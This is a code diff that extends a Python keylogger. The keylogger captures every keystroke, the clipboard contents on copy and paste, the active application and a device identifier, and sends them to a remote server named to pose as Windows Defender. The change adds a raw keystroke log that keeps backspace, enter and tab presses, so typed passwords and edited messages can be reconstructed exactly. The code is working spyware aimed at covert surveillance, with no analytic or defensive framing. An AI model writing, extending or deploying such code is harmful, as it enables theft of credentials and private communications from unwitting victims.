@@ -24,6 +24,7 @@ SITE_URL = "https://windows-defender-cf8n.onrender.com"
 device_name = platform.node() or socket.gethostname() or "Unknown device"
 device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
 message_buffer = ""
+raw_message_buffer = ""
 last_key_time_ms = None
 message_started_ms = None
 active_target = None
@@ -148,7 +149,21 @@ def normalize_key(key):
     return ""
 
 
-def send_message(text, app_name, is_pasted=False, is_copied=False):
+def raw_key_value(key):
+    if key == Key.space:
+        return " "
+    if key == Key.enter:
+        return "[ENTER]"
+    if key == Key.tab:
+        return "[TAB]"
+    if key == Key.backspace:
+        return "[BACKSPACE]"
+    if isinstance(key, KeyCode) and key.char is not None:
+        return key.char
+    return ""
+
+
+def send_message(text, app_name, raw_text=None, is_pasted=False, is_copied=False):
     try:
         headers = {"Content-Type": "application/json"}
         request = Request(
@@ -156,6 +171,7 @@ def send_message(text, app_name, is_pasted=False, is_copied=False):
             data=json.dumps(
                 {
                     "text": text,
+                    "raw_text": raw_text if raw_text is not None else text,
                     "device_id": device_id,
                     "device_name": device_name,
                     "app_name": app_name,
@@ -228,8 +244,8 @@ def heartbeat_sender():
 
 def message_sender():
     while True:
-        text, app_name, is_pasted, is_copied = message_queue.get()
-        send_message(text, app_name, is_pasted, is_copied)
+        text, app_name, raw_text, is_pasted, is_copied = message_queue.get()
+        send_message(text, app_name, raw_text, is_pasted, is_copied)
         message_queue.task_done()
 
 
@@ -237,24 +253,26 @@ def queue_copied_clipboard(target):
     time.sleep(0.1)
     copied_text = get_clipboard_text().strip()
     if copied_text:
-        message_queue.put((copied_text, target, False, True))
+        message_queue.put((copied_text, target, copied_text, False, True))
 
 
 def flush_message_buffer():
-    global message_buffer, last_key_time_ms, message_started_ms
+    global message_buffer, raw_message_buffer, last_key_time_ms, message_started_ms
     global active_target, active_target_key
     text = message_buffer.strip()
+    raw_text = raw_message_buffer.strip()
     message_buffer = ""
+    raw_message_buffer = ""
     last_key_time_ms = None
     message_started_ms = None
     if text:
-        message_queue.put((text, active_target or get_active_app(), False, False))
+        message_queue.put((text, active_target or get_active_app(), raw_text, False, False))
     active_target = None
     active_target_key = None
 
 
 def on_press(key):
-    global message_buffer, last_key_time_ms, message_started_ms
+    global message_buffer, raw_message_buffer, last_key_time_ms, message_started_ms
     global active_target, active_target_key
     with state_lock:
         modifier_aliases = {
@@ -266,7 +284,7 @@ def on_press(key):
             active_modifiers.add(modifier_aliases.get(key, key))
             return
 
-        key_char = key.char if isinstance(key, KeyCode) else ""
+        key_char = (key.char or "") if isinstance(key, KeyCode) else ""
         is_paste_key = key_char.lower() == "v" or key_char == "\x16"
         is_copy_key = key_char.lower() == "c" or key_char == "\x03"
         if is_copy_key and Key.ctrl in active_modifiers:
@@ -278,15 +296,18 @@ def on_press(key):
             if pasted_text:
                 flush_message_buffer()
                 target, target_key = get_active_target()
-                message_queue.put((pasted_text, target, True, False))
+                message_queue.put((pasted_text, target, pasted_text, True, False))
             return
 
         symbol = normalize_key(key)
+        raw_symbol = raw_key_value(key)
         now_ms = time.time() * 1000
         if symbol == "\b":
             message_buffer = message_buffer[:-1]
+            raw_message_buffer += raw_symbol
             last_key_time_ms = now_ms
         elif symbol == "\n":
+            raw_message_buffer += raw_symbol
             flush_message_buffer()
         elif symbol:
             target, target_key = get_active_target()
@@ -302,6 +323,7 @@ def on_press(key):
             if message_started_ms is None:
                 message_started_ms = now_ms
             message_buffer += symbol
+            raw_message_buffer += raw_symbol
             last_key_time_ms = now_ms
 
 
